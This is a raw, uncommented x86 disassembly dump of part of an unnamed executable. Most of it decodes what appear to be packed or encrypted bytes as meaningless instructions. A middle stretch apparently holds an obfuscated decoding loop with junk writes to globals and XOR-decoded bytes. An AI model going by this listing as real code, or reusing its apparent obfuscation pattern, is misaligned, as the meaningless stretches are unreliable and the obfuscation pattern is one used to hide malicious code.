  4057ea:	fcmovnbe st,st(0)
  4057ec:	inc    edi
  4057ed:	sub    cl,BYTE PTR [esi]
  4057ef:	and    ebp,edx
  4057f1:	inc    edx
  4057f2:	xor    esp,ebp
  4057f4:	gs jmp 0x40584e
  4057f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057f8:	sub    ebx,DWORD PTR [ebx-0x272a5c3c]
  4057fe:	test   BYTE PTR [ebx],bh
  405800:	hlt    
  405801:	pop    edx
  405802:	mov    BYTE PTR [ecx+edi*1],0xe2
  405806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405807:	mov    edi,0x5833351b
  40580c:	test   eax,0xc5f9bb3e
  405811:	out    dx,al
  405812:	cmp    BYTE PTR [edx],ah
  405814:	add    ah,BYTE PTR [edi]
  405816:	inc    ebp
  405817:	icebp  
  405818:	adc    ebp,DWORD PTR [ebx+0x3ba97a49]
  40581e:	outs   dx,BYTE PTR ds:[esi]
  40581f:	sbb    cl,dh
  405821:	adc    dl,ch
  405823:	(bad)  [edi-0x1a57b89d]
  405829:	xchg   edi,eax
  40582a:	jno    0x4057ee
  40582c:	push   edx
  40582d:	ror    BYTE PTR [edx+edx*2],0xb0
  405831:	fadd   DWORD PTR [ebx-0x4f]
  405834:	mov    DWORD PTR [ebp+ebx*8+0x3308e015],esi
  40583b:	inc    esi
  40583c:	xor    BYTE PTR [ebp-0xc4832e8],bh
  405842:	jae    0x40585b
  405844:	popf   
  405845:	fdivr  QWORD PTR [ecx-0x7d]
  405848:	xchg   edi,eax
  405849:	dec    edi
  40584a:	enter  0x8ceb,0x75
  40584e:	xchg   DWORD PTR [edi],edi
  405850:	scas   al,BYTE PTR es:[edi]
  405851:	sbb    ebx,DWORD PTR [ebp+0x7f51ec00]
  405857:	xlat   BYTE PTR ds:[ebx]
  405858:	retf   0xfa40
  40585b:	retf   0xa578
  40585e:	jg     0x40581e
  405860:	in     eax,0x77
  405862:	popf   
  405863:	sub    al,0x6e
  405865:	mov    ds:0xbb020db1,al
  40586a:	xchg   BYTE PTR [edi+0x71],ah
  40586d:	dec    esi
  40586e:	mov    esi,0xa7dbe03c
  405873:	xchg   ecx,eax
  405874:	loope  0x405828
  405876:	mov    BYTE PTR [edi-0x2],ah
  405879:	(bad)  
  40587a:	pusha  
  40587b:	mov    esp,0x9b34ec7b
  405880:	leave  
  405881:	adc    DWORD PTR [ebp+0x72],edx
  405884:	mov    cl,0x2e
  405886:	stos   DWORD PTR es:[edi],eax
  405887:	call   0x4139:0x6b6d4309
  40588e:	test   ch,0xa2
  405891:	mov    edi,0x613b2f43
  405896:	les    esi,FWORD PTR [ebx-0x29]
  405899:	pop    ebp
  40589a:	or     DWORD PTR [esi+0x76440091],0x7ba36cc4
  4058a4:	mov    eax,0x9a2fbdd0
  4058a9:	in     al,0xa4
  4058ab:	(bad)  
  4058ad:	mov    BYTE PTR [ebp-0x2e2880f3],cl
  4058b3:	mov    eax,0x21e725a6
  4058b8:	push   edi
  4058b9:	pop    ecx
  4058ba:	sub    DWORD PTR [edi-0xb],ebx
  4058bd:	and    dl,al
  4058bf:	adc    esi,edi
  4058c1:	sub    ch,bl
  4058c3:	xchg   ebp,eax
  4058c4:	das    
  4058c5:	es jmp 0x7b9c:0xf9b024f5
  4058cd:	(bad)  
  4058ce:	frstor [ebx+ecx*8-0xd]
  4058d2:	pop    ss
  4058d3:	push   es
  4058d4:	xchg   ecx,eax
  4058d5:	mov    edi,0x5b16d2d1
  4058da:	xchg   edx,eax
  4058db:	inc    ebp
  4058dc:	add    al,0x8d
  4058de:	lock scas eax,DWORD PTR es:[edi]
  4058e0:	add    ch,ch
  4058e2:	jge    0x405883
  4058e4:	dec    ebp
  4058e5:	sbb    dh,ch
  4058e7:	mov    dh,bh
  4058e9:	mov    eax,ds:0x388dd478
  4058ee:	rcr    DWORD PTR [ecx+edx*1],cl
  4058f1:	inc    esp
  4058f2:	out    dx,al
  4058f3:	inc    edx
  4058f4:	inc    edx
  4058f5:	dec    ebp
  4058f6:	gs stos DWORD PTR es:[edi],eax
  4058f8:	sub    eax,0xbf710167
  4058fd:	dec    ebp
  4058fe:	add    eax,0xed944029
  405903:	test   al,0x1
  405905:	in     al,0x2c
  405907:	test   BYTE PTR [ebx],0x79
  40590a:	and    BYTE PTR [eax-0x6675f73a],bh
  405910:	mov    esp,0xce579
  405915:	sar    BYTE PTR [eax],cl
  405917:	test   al,0xd0
  405919:	pop    ss
  40591a:	jl     0x4058c1
  40591c:	and    al,0x64
  40591e:	xchg   ebx,eax
  40591f:	sti    
  405920:	loop   0x405995
  405922:	scas   al,BYTE PTR es:[edi]
  405923:	mov    ch,0x19
  405925:	(bad)  
  405926:	cmp    eax,0x2d8587ea
  40592b:	jnp    0x4058ef
  40592d:	pop    ebp
  40592e:	mov    ecx,0xb748a3c7
  405933:	or     ah,BYTE PTR [ebp-0x41695b84]
  405939:	and    dl,bl
  40593b:	aam    0x3b
  40593d:	bnd jnp 0x405905
  405940:	fnstenv [ebx-0x22075903]
  405946:	mov    al,ds:0xb74a89e5
  40594b:	les    edx,FWORD PTR [ebx+0x728ceaab]
  405951:	lods   eax,DWORD PTR ds:[esi]
  405952:	loopne 0x40596c
  405954:	pop    edx
  405955:	out    dx,eax
  405956:	cmp    ebp,DWORD PTR [edx-0xf7bc226]
  40595c:	cmp    esp,DWORD PTR [edx+edx*4+0x7d]
  405960:	loope  0x405902
  405962:	jp     0x4059df
  405964:	aad    0xa
  405966:	mov    eax,0xedfe01c9
  40596b:	outs   dx,DWORD PTR ds:[esi]
  40596c:	dec    edx
  40596d:	sub    ebp,DWORD PTR [esi+0x43]
  405970:	sub    eax,0xcceb2f1a
  405975:	pop    edx
  405976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405977:	sub    ah,BYTE PTR [edx-0x2a]
  40597a:	(bad)  
  40597b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40597c:	dec    eax
  40597d:	or     DWORD PTR [edx+edi*8-0x45],ebx
  405981:	retf   
  405982:	dec    edi
  405983:	or     al,0x2d
  405985:	mov    ebp,0x72abb03
  40598a:	lds    esi,FWORD PTR [eax-0x24]
  40598d:	cdq    
  40598e:	and    edi,0xffffffe4
  405991:	clc    
  405992:	inc    esi
  405993:	inc    ecx
  405994:	mov    dl,0xf8
  405996:	mov    dl,0x7a
  405998:	popa   
  405999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40599a:	jo     0x4059c3
  40599c:	sahf   
  40599d:	and    ecx,DWORD PTR [edi+esi*2]
  4059a0:	ror    DWORD PTR [ebx+ecx*1-0x47],1
  4059a4:	loopne 0x4059a8
  4059a6:	out    0x6d,al
  4059a8:	mov    dl,0x14
  4059aa:	call   0x3c7eb815
  4059af:	xor    eax,0x198bf766
  4059b4:	test   al,0x77
  4059b6:	out    0xc8,al
  4059b8:	imul   edi,DWORD PTR [ecx+ecx*2+0x79cae98c],0x20a4b258
  4059c3:	(bad)  
  4059c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059c5:	retf   
  4059c6:	outs   dx,BYTE PTR ds:[esi]
  4059c7:	xor    al,0x51
  4059c9:	push   esi
  4059ca:	adc    BYTE PTR [esi+0xe],dl
  4059cd:	aas    
  4059ce:	daa    
  4059cf:	pop    esp
  4059d0:	inc    esp
  4059d1:	mov    bx,0xab53
  4059d5:	push   ds
  4059d6:	out    dx,al
  4059d7:	inc    esi
  4059d8:	es nop
  4059da:	jno    0x4059a0
  4059dc:	mov    bl,0x85
  4059de:	in     eax,0x22
  4059e0:	mov    ds,esp
  4059e2:	inc    ebp
  4059e3:	es test eax,0x100be260
  4059e9:	jl     0x405a07
  4059eb:	xor    al,0xd4
  4059ed:	xchg   ebp,eax
  4059ee:	jno    0x4059a8
  4059f0:	imul   ecx,DWORD PTR ss:[edi],0x4332a7ac
  4059f7:	mov    esi,0x33e577be
  4059fc:	add    DWORD PTR [ecx+0x49a2456d],esi
  405a02:	lahf   
  405a03:	out    dx,eax
  405a04:	iret   
  405a05:	gs dec ecx
  405a07:	ins    DWORD PTR es:[edi],dx
  405a08:	sub    BYTE PTR [esp+ebx*8],dl
  405a0b:	leave  
  405a0c:	fisub  WORD PTR [edi]
  405a0e:	add    eax,0x54aa8e16
  405a13:	or     DWORD PTR [ebx+0x38a49595],0xe2baeedc
  405a1d:	inc    ebx
  405a1e:	xlat   BYTE PTR ds:[ebx]
  405a1f:	mov    edx,0xa66509cb
  405a24:	aas    
  405a25:	push   edi
  405a26:	mov    BYTE PTR [edi+0xf],bh
  405a29:	xor    al,0x3
  405a2b:	icebp  
  405a2c:	scas   eax,DWORD PTR es:[edi]
  405a2d:	pop    eax
  405a2e:	cmp    eax,0xbb1a480e
  405a33:	cmp    DWORD PTR [esi-0x41],ebx
  405a36:	out    dx,al
  405a37:	cmp    ebx,DWORD PTR [ebx+eiz*1]
  405a3a:	mov    edx,0x46b564be
  405a3f:	scas   al,BYTE PTR es:[edi]
  405a40:	popf   
  405a41:	add    al,0x8d
  405a43:	sub    DWORD PTR [eax-0x6fd52578],esi
  405a49:	jle    0x405aca
  405a4b:	mov    DWORD PTR [esp+esi*1-0x151ed84d],eax
  405a52:	xlat   BYTE PTR ds:[ebx]
  405a53:	xchg   ecx,eax
  405a54:	jge    0x405a4c
  405a56:	cmp    ebx,ebp
  405a58:	or     bh,dl
  405a5a:	lock and bh,dl
  405a5d:	(bad)  
  405a5e:	lahf   
  405a5f:	mov    DWORD PTR [esi+0xf],ecx
  405a62:	and    al,0x8c
  405a64:	mov    eax,ds:0xcd6b162e
  405a69:	pop    ebp
  405a6a:	data16 or BYTE PTR gs:0xf612c76,0x9b
  405a73:	jns    0x405a7f
  405a75:	pop    ebx
  405a76:	push   esp
  405a77:	inc    esi
  405a78:	das    
  405a79:	or     esi,DWORD PTR ds:0xd01fedc3
  405a7f:	pause  
  405a81:	sub    dl,BYTE PTR cs:[edi-0x13]
  405a85:	in     al,dx
  405a86:	cmp    DWORD PTR [esi],esp
  405a88:	push   ebp
  405a89:	dec    esp
  405a8a:	scas   eax,DWORD PTR es:[edi]
  405a8b:	pop    esp
  405a8c:	aas    
  405a8d:	test   BYTE PTR [ebx-0x692d9642],cl
  405a93:	test   al,0x6f
  405a95:	mov    esp,0x33b6a7de
  405a9a:	push   0x48
  405a9c:	dec    esp
  405a9d:	and    BYTE PTR [esi],dh
  405a9f:	inc    BYTE PTR [ebx-0x530f945d]
  405aa5:	adc    DWORD PTR [edx-0x3b83af34],esp
  405aab:	lods   al,BYTE PTR ds:[esi]
  405aac:	repz in eax,0xea
  405aaf:	add    eax,0xe5710933
  405ab4:	pop    edi
  405ab5:	bound  eax,QWORD PTR [ebx+0xb]
  405ab8:	mov    dh,al
  405aba:	ret    0x333f
  405abd:	cld    
  405abe:	enter  0x5a4,0xe7
  405ac2:	xchg   esp,eax
  405ac3:	mov    al,0x9c
  405ac5:	mov    dh,0x99
  405ac7:	mov    al,0x4f
  405ac9:	in     eax,0xf8
  405acb:	pop    ecx
  405acc:	rol    DWORD PTR [ebx-0x380c23c2],0x41
  405ad3:	push   0xfffffff1
  405ad5:	dec    esi
  405ad6:	inc    esp
  405ad7:	cdq    
  405ad8:	or     bl,BYTE PTR [eax]
  405ada:	sub    edx,0x55ec7c26
  405ae0:	fcomp  DWORD PTR [edx+0x5]
  405ae3:	cmp    al,BYTE PTR [edx+eax*2+0x5b]
  405ae7:	div    esi
  405ae9:	out    dx,eax
  405aea:	(bad)  
  405aeb:	inc    BYTE PTR [edi-0x5]
  405aee:	aam    0x1
  405af0:	nop
  405af1:	scas   eax,DWORD PTR es:[edi]
  405af2:	jo     0x405a74
  405af4:	addr16 adc eax,0xab621bec
  405afa:	push   esi
  405afb:	rcr    bl,1
  405afd:	aad    0x1a
  405aff:	fisubr WORD PTR [edi+0x167fa160]
  405b05:	int3   
  405b06:	pop    esi
  405b07:	dec    ecx
  405b08:	rcl    DWORD PTR ds:0x726e232a,0xf2
  405b0f:	mov    edi,0xeb1e9505
  405b14:	inc    ecx
  405b15:	hlt    
  405b16:	loopne 0x405aac
  405b18:	cmp    bh,ah
  405b1a:	jmp    0xed5b:0xd4b18787
  405b21:	cmp    al,0x4a
  405b23:	cld    
  405b24:	sub    al,0xc0
  405b26:	popa   
  405b27:	add    al,0xb3
  405b29:	add    ah,BYTE PTR [ebx-0x2671faae]
  405b2f:	jae    0x405b4d
  405b31:	ret    0x5583
  405b34:	push   cs
  405b35:	mov    ebx,0xf4a569ca
  405b3a:	sub    esi,esi
  405b3c:	jge    0x405b96
  405b3e:	adc    esi,DWORD PTR [esi-0x5c44cb08]
  405b44:	out    dx,eax
  405b45:	mov    edx,0xeba90dbe
  405b4a:	or     al,0xa6
  405b4c:	mov    DWORD PTR [eax+0x3b],ecx
  405b4f:	ins    BYTE PTR es:[edi],dx
  405b50:	lods   eax,DWORD PTR ds:[esi]
  405b51:	icebp  
  405b52:	lea    esi,[ecx]
  405b54:	shr    BYTE PTR [eax+0x6a5f81a7],cl
  405b5a:	into   
  405b5b:	fbld   TBYTE PTR [edi+0x42]
  405b5e:	sub    DWORD PTR [eax-0x3],ebp
  405b61:	sub    DWORD PTR [ebx+eax*2],eax
  405b64:	sbb    DWORD PTR [ecx+0x4e0f5baa],edi
  405b6a:	pushf  
  405b6b:	iret   
  405b6c:	fild   DWORD PTR [ecx+0x28]
  405b6f:	pop    eax
  405b70:	ret    
  405b71:	cmp    BYTE PTR [esi+0x33],bl
  405b74:	test   BYTE PTR [ebx-0x5a03a6ef],dh
  405b7a:	loopne 0x405be6
  405b7c:	(bad)  
  405b7d:	hlt    
  405b7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b7f:	stos   BYTE PTR es:[edi],al
  405b80:	cld    
  405b81:	scas   al,BYTE PTR es:[edi]
  405b82:	jns    0x405bfa
  405b84:	inc    esp
  405b85:	out    0x73,eax
  405b87:	push   edi
  405b88:	xchg   ebp,eax
  405b89:	push   0xffffff91
  405b8b:	test   eax,0xb9270773
  405b90:	cwde   
  405b91:	adc    edx,edx
  405b93:	mul    ebx
  405b95:	fld    QWORD PTR [esi+0x3de90263]
  405b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b9c:	(bad)  
  405b9d:	mov    ecx,DWORD PTR [ecx]
  405b9f:	inc    edx
  405ba0:	loope  0x405c19
  405ba2:	inc    ebp
  405ba3:	sub    DWORD PTR [ebp+0x1315bda9],ebx
  405ba9:	jbe    0x405b2c
  405bab:	mov    eax,ds:0x990fb259
  405bb0:	add    BYTE PTR [edi+edi*8],0x57
  405bb4:	pop    ebp
  405bb5:	jo     0x405b73
  405bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb8:	ss push ss
  405bba:	mov    dl,0x4e
  405bbc:	fsubr  QWORD PTR [esi]
  405bbe:	fstp   DWORD PTR [eax]
  405bc0:	popf   
  405bc1:	fsub   DWORD PTR [ebp+0x373d3656]
  405bc7:	cmp    edi,DWORD PTR [eax]
  405bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bca:	mov    ebx,DWORD PTR [esi]
  405bcc:	ret    0x79da
  405bcf:	stos   BYTE PTR es:[edi],al
  405bd0:	jp     0x405b94
  405bd2:	and    eax,DWORD PTR [ecx+0x45f3ed9]
  405bd8:	mov    DWORD PTR [edi],esi
  405bda:	rol    DWORD PTR [edi+0x43],0xc6
  405bde:	xchg   DWORD PTR [edx],esi
  405be0:	add    BYTE PTR [edi],dh
  405be2:	xchg   esp,eax
  405be3:	push   edi
  405be4:	ret    
  405be5:	ins    DWORD PTR es:[edi],dx
  405be6:	retf   0xc706
  405be9:	pusha  
  405bea:	push   0x1ac3a656
  405bef:	bound  edi,QWORD PTR [ebp-0x70]
  405bf2:	imul   edi,DWORD PTR [ebx-0x52],0xffffffda
  405bf6:	mov    dh,0x33
  405bf8:	jne    0x405c57
  405bfa:	mov    ebx,0xfb11ebb
  405bff:	xchg   esi,eax
  405c00:	inc    ecx
  405c01:	ss (bad) 
  405c04:	dec    ecx
  405c05:	(bad)  
  405c07:	mov    bl,0x8f
  405c09:	retf   0x6391
  405c0c:	lock mov eax,ds:0x5a26c757
  405c12:	cld    
  405c13:	ja     0x405bc4
  405c15:	adc    eax,0xe1b89af
  405c1a:	jecxz  0x405c28
  405c1c:	iret   
  405c1d:	xor    BYTE PTR [eax-0x6efb7cf9],cl
  405c23:	jno    0x405c05
  405c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c26:	jecxz  0x405beb
  405c28:	scas   al,BYTE PTR es:[edi]
  405c29:	cs out 0xba,al
  405c2c:	ds cwde 
  405c2e:	js     0x405caf
  405c30:	add    DWORD PTR [eax+0xb],ebx
  405c33:	repnz and eax,DWORD PTR [edx-0x2fb42ccf]
  405c3a:	pop    edi
  405c3b:	xchg   edi,eax
  405c3c:	sahf   
  405c3d:	in     eax,dx
  405c3e:	mov    ebp,0xe7eb0592
  405c43:	pop    es
  405c44:	mov    ch,0xb0
  405c46:	pusha  
  405c47:	mov    BYTE PTR [eax],cl
  405c49:	mov    BYTE PTR [edx-0x3f],bl
  405c4c:	inc    esi
  405c4d:	mov    cl,0x69
  405c4f:	(bad)  
  405c50:	stc    
  405c51:	jno    0x405c82
  405c53:	repnz push eax
  405c55:	cmc    
  405c56:	out    0xc,eax
  405c58:	ss (bad) 
  405c5a:	into   
  405c5b:	jg     0xefd7eb62
  405c61:	mov    bh,0x2b
  405c63:	hlt    
  405c64:	fbstp  TBYTE PTR [edx+0x78]
  405c67:	add    BYTE PTR [edi],dl
  405c69:	xor    bh,BYTE PTR [eax+0x5f]
  405c6c:	in     al,dx
  405c6d:	neg    dl
  405c6f:	fnstcw WORD PTR ds:0x3c988dd4
  405c75:	add    al,0xc2
  405c77:	fdiv   QWORD PTR [esi-0x66]
  405c7a:	leave  
  405c7b:	sub    BYTE PTR [ebx-0x7c],cl
  405c7e:	aam    0x6b
  405c80:	je     0x405cbf
  405c82:	aam    0xaa
  405c84:	jg     0x405c70
  405c86:	gs cdq 
  405c88:	sahf   
  405c89:	inc    esi
  405c8a:	push   ss
  405c8b:	and    BYTE PTR [eax-0x4d],cl
  405c8e:	cwde   
  405c8f:	ss das 
  405c91:	jg     0x405c23
  405c93:	pop    ds
  405c94:	scas   al,BYTE PTR es:[edi]
  405c95:	retf   
  405c96:	and    edx,ecx
  405c98:	sbb    DWORD PTR [eax+0x66],eax
  405c9b:	inc    edx
  405c9c:	(bad)  
  405c9d:	push   esp
  405c9e:	mov    al,0x11
  405ca0:	push   esi
  405ca1:	cwde   
  405ca2:	fimul  DWORD PTR ds:0x5e388fb5
  405ca8:	mov    ecx,0xd57dad0c
  405cad:	(bad)  
  405caf:	add    al,0x36
  405cb2:	xchg   ebx,eax
  405cb3:	push   es
  405cb4:	(bad)  
  405cb6:	ds lods al,BYTE PTR ss:[esi]
  405cb9:	add    ah,ch
  405cbb:	xchg   esp,eax
  405cbc:	(bad)  
  405cbd:	fidiv  DWORD PTR [ecx]
  405cbf:	call   0x74060a11
  405cc4:	pusha  
  405cc5:	push   eax
  405cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cc7:	jmp    0x260d:0x4052b28a
  405cce:	outs   dx,BYTE PTR ds:[esi]
  405ccf:	cmp    eax,0x45768f47
  405cd4:	xchg   esp,eax
  405cd5:	xchg   edi,eax
  405cd6:	pop    edx
  405cd7:	loopne 0x405d49
  405cd9:	or     ah,BYTE PTR [eax-0x73]
  405cdc:	in     al,dx
  405cdd:	inc    ecx
  405cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cdf:	fisub  WORD PTR [ebp+edx*2+0x19699e0]
  405ce6:	sbb    eax,ecx
  405ce8:	cmp    BYTE PTR [edx+esi*4],al
  405ceb:	enter  0x268d,0xdf
  405cef:	cld    
  405cf0:	mov    al,0xb9
  405cf2:	mov    esi,DWORD PTR [ebx-0x57309331]
  405cf8:	jp     0x405ca7
  405cfa:	mov    WORD PTR [ecx],es
  405cfc:	fs mov eax,0x891f03d5
  405d02:	dec    ebp
  405d03:	in     al,dx
  405d04:	mov    edx,DWORD PTR [ebp-0x14]
  405d07:	xor    edx,esi
  405d09:	add    DWORD PTR ds:0x42d01c,0x429028
  405d13:	add    edx,0x7f55d8f2
  405d19:	mov    DWORD PTR ds:0x42a004,0x7cae
  405d23:	lea    ecx,[ebp+eax*4-0xb4]
  405d2a:	mov    DWORD PTR [ecx],edx
  405d2c:	mov    DWORD PTR ds:0x42d018,0x76cd
  405d36:	mov    edx,DWORD PTR [ecx]
  405d38:	mov    DWORD PTR ds:0x429024,0x63
  405d42:	cmp    edx,0x244ecb93
  405d48:	mov    DWORD PTR ds:0x42c01c,0x464d
  405d52:	jbe    0x405d6d
  405d58:	sub    DWORD PTR ds:0x42a000,0x42d004
  405d62:	add    DWORD PTR [ecx],0x405fcdc
  405d68:	jmp    0x405d7d
  405d6d:	or     DWORD PTR ds:0x42b014,0x429010
  405d77:	add    DWORD PTR [ecx],0xfdaf4324
  405d7d:	sbb    ecx,DWORD PTR ds:0x42a000
  405d83:	mov    ecx,DWORD PTR [ebp-0x18]
  405d86:	sbb    DWORD PTR ds:0x42d010,0x42c010
  405d90:	xor    ecx,esi
  405d92:	sbb    DWORD PTR ds:0x42a004,0x42d018
  405d9c:	inc    eax
  405d9d:	inc    DWORD PTR [ebp-0x14]
  405da0:	add    ecx,edi
  405da2:	mov    DWORD PTR ds:0x42d01c,0x794d
  405dac:	cmp    eax,ecx
  405dae:	mov    DWORD PTR ds:0x42b004,0x68cc
  405db8:	jb     0x405d04
  405dbe:	and    DWORD PTR ds:0x42b010,0x0
  405dc8:	jmp    0x405ddb
  405dcd:	xor    eax,eax
  405dcf:	or     eax,DWORD PTR ds:0x42b010
  405dd5:	inc    eax
  405dd6:	mov    ds:0x42b010,eax
  405ddb:	cmp    DWORD PTR ds:0x42b010,0x10
  405de2:	jae    0x405e2a
  405de8:	cmp    DWORD PTR ds:0x42b010,0xa
  405def:	jbe    0x405e2a
  405df5:	jmp    0x405e0d
  405dfa:	push   0x42f19b
  405dff:	push   DWORD PTR [ebp-0x28]
  405e02:	push   0x6b57
  405e07:	call   DWORD PTR ds:0x43003b
  405e0d:	cmp    DWORD PTR ds:0x42b010,0x9
  405e14:	jne    0x405e25
  405e1a:	mov    eax,ds:0x42b010
  405e1f:	inc    eax
  405e20:	mov    ds:0x42b010,eax
  405e25:	jmp    0x405dcd
  405e2a:	mov    dl,BYTE PTR [ebp-0x21]
  405e2d:	mov    eax,DWORD PTR [ebp-0x34]
  405e30:	xor    al,0xa4
  405e32:	or     DWORD PTR ds:0x429020,0x7a52
  405e3c:	mov    cl,0x14
  405e3e:	and    DWORD PTR ds:0x42c004,0x42a008
  405e48:	sub    cl,al
  405e4a:	add    dl,cl
  405e4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  405e4f:	xor    cl,0xa4
  405e52:	neg    DWORD PTR ds:0x42d008
  405e58:	sub    cl,0x14
  405e5b:	xor    DWORD PTR ds:0x429014,0x42b01c
  405e65:	ror    dl,cl
  405e67:	xor    eax,eax
  405e69:	mov    eax,DWORD PTR [ebp-0xc]
  405e6c:	add    DWORD PTR ds:0x42c00c,edx
  405e72:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  405e79:	and    DWORD PTR ds:0x42b000,0x0
  405e83:	jmp    0x405e96
  405e88:	xor    eax,eax
  405e8a:	add    eax,DWORD PTR ds:0x42b000
  405e90:	inc    eax
  405e91:	mov    ds:0x42b000,eax
  405e96:	cmp    DWORD PTR ds:0x42b000,0x10
  405e9d:	jae    0x405ede
  405ea3:	cmp    DWORD PTR ds:0x42b000,0x7
  405eaa:	jbe    0x405ede
  405eb0:	jmp    0x405ebe
  405eb5:	push   DWORD PTR [ebp-0x14]
  405eb8:	call   DWORD PTR ds:0x43003f
  405ebe:	cmp    DWORD PTR ds:0x42b000,0x6
  405ec5:	jne    0x405ed9
  405ecb:	xor    eax,eax
  405ecd:	xor    eax,DWORD PTR ds:0x42b000
  405ed3:	inc    eax
  405ed4:	mov    ds:0x42b000,eax
  405ed9:	jmp    0x405e88
  405ede:	mov    eax,DWORD PTR [ebp-0xc]
  405ee1:	mov    ecx,DWORD PTR [ebp-0x28]
  405ee4:	sub    eax,edi
  405ee6:	xor    eax,esi
  405ee8:	cmp    eax,ecx
  405eea:	jne    0x405f14
  405ef0:	mov    eax,DWORD PTR [ebp-0x8]
  405ef3:	mov    ecx,DWORD PTR [ebp-0x10]
  405ef6:	xor    eax,esi
  405ef8:	xor    ecx,esi
  405efa:	sub    eax,ecx
  405efc:	sub    eax,edi
  405efe:	xor    eax,esi
  405f00:	mov    DWORD PTR [ebp-0x8],eax
  405f03:	mov    eax,DWORD PTR [ebp-0x10]
  405f06:	xor    eax,esi
  405f08:	mov    ecx,0xffcd8d94
  405f0d:	sub    ecx,eax
  405f0f:	jmp    0x405f23
  405f14:	mov    eax,DWORD PTR [ebp-0x10]
  405f17:	xor    eax,esi
  405f19:	mov    ecx,0xffcd8d14
  405f1e:	sub    ecx,eax
  405f20:	add    ecx,DWORD PTR [ebp-0xc]
  405f23:	mov    DWORD PTR [ebp-0xc],ecx
  405f26:	mov    eax,DWORD PTR [ebp-0x8]
  405f29:	cmp    eax,0xf89c85b0
  405f2e:	jne    0x403809
  405f34:	mov    DWORD PTR [ebp-0x34],0x9
  405f3b:	mov    ecx,DWORD PTR [ebp+0x8]
  405f3e:	xor    ecx,esi
  405f40:	add    ecx,edi
  405f42:	jmp    0x40cbb6
  405f47:	lea    eax,[ecx+ebx*1]
  405f4a:	mov    DWORD PTR [ebp-0x2c],eax
  405f4d:	mov    eax,DWORD PTR [ebp-0x58]
  405f50:	sub    eax,ecx
  405f52:	mov    DWORD PTR [ebp-0x1c],eax
  405f55:	mov    eax,DWORD PTR [ebp-0x1c]
  405f58:	mov    DWORD PTR [ebp-0x14],eax
  405f5b:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5e:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  405f65:	mov    DWORD PTR [ebp-0x54],eax
  405f68:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  405f6f:	mov    eax,DWORD PTR [ebp-0x38]
  405f72:	xor    eax,esi
  405f74:	add    eax,edi
  405f76:	mov    DWORD PTR [ebp-0x10],eax
  405f79:	jmp    0x4082d5
  405f7e:	lds    ebp,FWORD PTR [ecx]
  405f80:	lea    esi,[esi-0x7f]
  405f83:	(bad)  
  405f84:	jns    0x405fff
  405f86:	jbe    0x405ffc
  405f88:	retf   
  405f89:	mov    BYTE PTR [eax],al
  405f8b:	retf   
  405f8c:	sbb    ah,ah
  405f8e:	clc    
  405f8f:	xor    BYTE PTR [edx+0x7a],bh
  405f92:	cmp    ebx,DWORD PTR [edi+0x7a]
  405f95:	jp     0x405fc0
  405f97:	inc    ebp
  405f98:	push   cs
  405f99:	ret    0xabdd
  405f9c:	cmc    
  405f9d:	mov    ecx,0x16f228c6
  405fa2:	dec    ebx
  405fa3:	fst    QWORD PTR [esi+0x55]
  405fa6:	sbb    dl,cl
  405fa8:	jne    0x405fcb
  405faa:	fdiv   st,st(1)
  405fac:	int    0x1c
  405fae:	pop    ds
  405faf:	gs mov esp,0x843cdef5
  405fb5:	(bad)  
  405fb6:	addr16 push ebx
  405fb8:	jl     0x406035
  405fba:	inc    edi
  405fbb:	mov    bh,0xc5
  405fbd:	(bad)  
  405fbe:	pop    ebp
  405fbf:	call   0xf939:0x2b54bfae
  405fc6:	ret    0xdba9
  405fc9:	fwait
  405fca:	retf   
  405fcb:	aas    
  405fcc:	pop    es
  405fcd:	inc    esp
  405fce:	int    0x87
  405fd0:	mov    dh,bh
  405fd2:	pop    edi
  405fd3:	iret   
  405fd4:	xor    DWORD PTR [esi],ebp
  405fd6:	es add al,0x9a
  405fd9:	dec    eax
  405fda:	(bad)  
  405fdb:	mov    eax,0x5babde1f
  405fe0:	mov    cl,0xf
  405fe2:	push   edx
  405fe3:	daa    
  405fe4:	sti    
  405fe5:	and    ch,BYTE PTR [ebx-0x35352c59]
  405feb:	or     ecx,DWORD PTR [ecx+0x41]
  405fee:	lahf   
  405fef:	push   ebx
  405ff0:	shl    bl,0xb8
  405ff3:	or     ebp,DWORD PTR [ebp+0x38a8d384]
  405ff9:	push   ecx
  405ffa:	pusha  
  405ffb:	retf   0xb4c9
  405ffe:	aas    
  405fff:	mov    dh,0x88
  406001:	iret   
  406002:	sub    DWORD PTR [ebx+edx*1],eax
  406005:	inc    esp
  406006:	mov    BYTE PTR ds:0x69e46bd9,cl
  40600c:	cld    
  40600d:	addr16 mov al,0x0
  406010:	add    BYTE PTR [edi-0x27c61e6b],bh
  406016:	cmp    eax,0xdaeaad82
  40601b:	xchg   BYTE PTR [eax+0x6ba1a619],bh
  406021:	js     0x406085
  406023:	into   
  406024:	(bad)  
  406025:	lds    esi,FWORD PTR [edx-0x7a8291e6]
  40602b:	add    eax,0xdb5c98c9
  406030:	std    
  406031:	out    dx,eax
  406032:	jl     0x40606d
  406034:	mov    dh,0x19
  406036:	push   ss
  406037:	nop
  406038:	call   0x62bf4cbe
  40603d:	inc    esp
  40603e:	sahf   
  40603f:	ret    0x8cad
  406042:	sub    dl,BYTE PTR [ebp+0x77]
  406045:	scas   eax,DWORD PTR es:[edi]
  406046:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406048:	xor    BYTE PTR [edi+0x79ef524b],ch
  40604e:	sbb    eax,0xc25443b0
  406053:	data16 sti 
  406055:	pop    edx
